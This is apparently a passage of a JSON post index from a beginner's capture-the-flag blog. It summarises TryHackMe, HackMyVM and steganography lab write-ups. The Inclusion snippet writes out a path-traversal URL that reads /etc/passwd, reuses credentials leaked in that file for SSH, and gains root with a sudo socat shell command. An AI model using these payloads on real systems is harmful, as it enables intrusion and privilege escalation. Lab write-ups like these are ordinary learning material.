machine is pwned. Submit the flags and get the points. Let me know if theres something you want to mention about the blog or anything in general. I’ll be happy to talk! :smile:" }, { "title": "Inclusion - TryHackMe", "url": "/posts/LFI-TryHackMe/", "categories": "", "tags": "Write-Ups", "date": "2021-07-29 00:00:00 +0500", "snippet": "This is a room best for beginners to understand and exploit LFI Vulnerabilty. If you want to follow along, You can join the room here, InclusionEnumeration:First of all I ran the NMAP scan and found 2 ports open. Here’s what I found:└─$ nmap -A 10.10.186.213 -p- -vvv Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 20:54 PKTNmap scan report for 10.10.186.213 (10.10.186.213)Host is up (0.28s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)| 256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)|_ 256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)80/tcp open http Werkzeug httpd 0.16.0 (Python 3.6.9)|_http-title: My blogService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.28 secondsOkay so port 80 is open for http. Before I go and manually look, lets fire up dirsearch. Dirsearch did not find anything. But in my enumeration of the website, I found it to be vulnerable to LFI.The parameter article?name=was vulnerable to LFI.ExploitationI tried reading the /etc/passwd file and I could see the contents. http://10.10.186.213/article?name=../../../../../../../../../../etc/passwdIt returned this:root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsefalconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash#falconfeast:rootpasswordsshd:x:110:65534::/run/sshd:/usr/sbin/nologinmysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/falseAnd there was a comment in the /etc/passwd file. falconfeast:rootpasswdThis looks like credentials, so lets use them for SSH into Falconfeast.And it worked!We’re in Falconfeast. The “user.txt” file is right in the home directory:609************And the first thing we do is run the command:sudo -land we get:User falconfeast may run the following commands on inclusion: (root) NOPASSWD: /usr/bin/socatWe know that we can escalate privileges to root using SOCAT. So go over to GTFOBINS and search for SOCAT. We found this: sudo socat stdin exec:/bin/shWe use this and BOOM! We are ROOT!Root flag:429********Let me know if you like it or would like to let me know something from the contact links below ; )" }, { "title": "Gift - HackMyVM Walkthrough", "url": "/posts/Gift-HackMyVM-Walkthrough/", "categories": "", "tags": "Write-Ups", "date": "2021-07-19 00:00:00 +0500", "snippet": "Gift is a really easy machine from HackMyVM created by sml. Perfect for beginners and the ones just started in the field. Here’s my write Up..So we start off with an nmap scan, which i already ran and saved as “Initial”:I see port 80 open and a website on it. Let’s see whats on it.Oh okay. That’s something. Let’s take a look at the source code of the website.Well I definately don’t. This seemed strange to me. I ran a nikto scan as well thinking it might bring up something. But nothing of much use.I started a Directory scan with gobuster and this also turned nothing!!So by now I was confused. It wasn’t making much sense. But I ran a Hydra ssh Brute Force and we got it.It literally was “Simple” (heh). Let us SSH in the machine.Aaaaaand we’re in. We’re also “Root” user so we can just get the both flags from the “/root” directory.And that’s it. We pwned the machine. Let me know if you liked the write up or you want to give me any suggestions. You can find me on my socials below in the footer. I’m new in writing walkthroughs and writeups. pls go easy one me.. :wink:" }, { "title": "Panic At The Disco - Stego Challenge", "url": "/posts/Panic-At-The-Disco-Stego/", "categories": "", "tags": "Write-Ups", "date": "2021-06-13 00:00:00 +0500", "snippet": "Here we are given a simple png file.So as some of the first checks, I ran string on itstrings PandeAtTheDisco.pngAnd found what looks like a base64 encoded string:ZmxhZ3thcHBvbHNfYXJlX3Rhc3R5fQ==So i used the base64 -d command on terminal to decode it and get the flag!And voila! we get the flag!" } ]
